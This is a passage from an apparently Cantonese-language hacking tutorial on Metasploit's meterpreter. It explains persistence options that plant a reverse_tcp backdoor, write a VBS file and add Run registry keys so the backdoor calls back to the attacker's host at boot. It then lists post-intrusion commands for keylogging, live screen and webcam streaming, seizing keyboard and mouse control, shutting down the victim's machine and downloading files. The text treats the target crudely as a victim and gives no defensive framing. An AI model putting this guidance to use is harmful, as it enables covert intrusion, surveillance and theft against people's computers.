or

成句意思就係每五秒會自動連上 你既 [Host Number] 既 [Port Number]
之後就會喺目標既機度自動 gen 個 vbs file，
再將佢入落去 Regedit (登錄檔)，只要佢一開機就會自己開。

  • -P：設置Payload，默認為windows/meterpreter/reverse_tcp。
    該默認的payload生成的後門為32位程序。
    因此，當目標機器為64位系統時，留下的後門將無法運行；

  • -U：設置後門在用戶登錄後自啟動。
    該方式會在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息，推薦使用該參數。

  • -X：設置後門在系統啟動後自啟動。
    該方式會在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息。
    由於權限問題，會導致添加失敗，後門將無法啟動。
    因此，在非管理員權限或者未進行BypassUAC操作情況下，不推薦使用該參數。

  • -i：設置反向連接間隔時間，單位為秒，當設置該參數後，目標機器會每隔設置的時間回連一次所設置的ip

  • -p：設置反向連接的端口號。即等待連接的端口；

  • -r：設置反向連接的ip地址。即等待連接的ip；

入返去 meterpreter 打help

常用指令 (入侵後)

  • reboot 重開條友部機
  • shutdown 熄鳩條友部機
  • help 所有指令
  • uictl 控制佢 Keyboard Mouse 既 開關
  • ls 列出呢個Paths既 Files Folder
  • cd 進入
  • ps 列出佢開緊啲乜Program
  • screenshare 直播佢部機既畫面
  • screenshot Cap佢部機而加既畫面
  • mouse 控制佢部機而加既 x y 坐標
  • keyscan_start 開始 Capturing 佢Keyboard撳過d乜制
  • keyscan_dump 攞你 Capturing 到既 Key
  • keyscan_stop 停止 Captring Keyboard
  • keyevent 發送鍵盤文字
  • sysinfo 攞佢呢部機而加既系統資料
  • suspend 停鳩佢某程式既控制
  • shell 用cmd
  • webcam_stream 佢如果有webcam 就直播佢webcam (需要有Browser)
  • load 載入套件
  • migrate 將程式移動特定 Process (Inject)
  • download 下載檔案
